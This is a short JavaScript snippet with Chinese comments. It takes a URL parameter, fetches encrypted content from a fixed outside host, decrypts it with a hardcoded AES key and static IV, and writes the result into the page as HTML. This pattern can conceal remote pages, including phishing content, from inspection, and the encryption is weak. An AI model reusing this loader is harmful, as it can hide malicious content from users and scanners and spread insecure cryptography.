(async () => {
    // 1. 从 URL 查询参数中获取 c
    const urlParams = new URLSearchParams(window.location.search);
    const c = urlParams.get('c');

    if (!c) {
        document.write('<h1>缺少参数 c</h1>');
        return;
    }

    // 2. 直接把 c 参数传给后端（作为路径参数）
    const res = await fetch(`https://fhadmin.matacn.cn/auth/${encodeURIComponent(c)}`);
    const htmlEnc = await res.text();

    // 3. 生成密钥（SHA-256 摘要）
    const dec = await crypto.subtle.digest(
        'SHA-256',
        new TextEncoder().encode('04c1cf376ec77c9c4c2dbde5a240a57e')
    );
    const key = await crypto.subtle.importKey('raw', dec, 'AES-CBC', false, ['decrypt']);

    // 4. 固定的 IV
    const iv = new TextEncoder().encode('1234567890abcdef');

    // 5. 解密返回内容
    try {
        const buf = await crypto.subtle.decrypt(
            { name: 'AES-CBC', iv: iv },
            key,
            Uint8Array.from(atob(htmlEnc), c => c.charCodeAt(0))
        );
        document.write(new TextDecoder().decode(buf));
    } catch (error) {
        document.write('<h1>解密失败</h1>');
        console.error('解密失败:', error);
    }
})();
